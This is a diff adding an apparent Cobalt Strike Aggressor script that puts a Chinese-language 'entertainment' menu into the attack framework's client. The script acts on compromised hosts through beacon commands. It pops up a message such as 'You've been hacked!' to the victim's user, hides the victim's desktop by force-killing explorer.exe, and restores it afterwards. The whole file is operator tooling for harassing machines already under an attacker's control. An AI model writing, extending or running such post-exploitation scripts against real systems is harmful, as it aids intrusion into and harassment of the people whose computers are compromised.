@@ -1,0 +1,31 @@
+#define functions
+
+sub Send {
+        $username = replace(beacon_info($bid,"user"),' \*',"");
+        $msg = $3['msg'];
+        if(($username cmp "SYSTEM") == 0){
+            show_error("Cannot send message with SYSTEM !");
+            return;
+        }
+        bshell($bid,"msg $username \"$msg\"");
+    }
+#append menus
+
+    menu "娱乐功能"{
+                item "聊天"{
+                    $bid = $1['@'];
+                    $dialog = dialog("聊天", %(msg => "你被黑了! 来自: ".beacon_info($bid,"user"),bid => $bid), &Send);
+                    dialog_description($dialog, "向目标主机发送消息");
+                    drow_text_big($dialog,"msg","消息内容:");
+                    dbutton_action($dialog, "发送");
+                    dialog_show($dialog);
+                }
+
+                item "隐藏桌面"{
+                    bshell($1,"taskkill /F /IM explorer.exe");
+                }
+
+                item "恢复桌面"{
+                    brun($1, "explorer.exe");
+                }
+            }
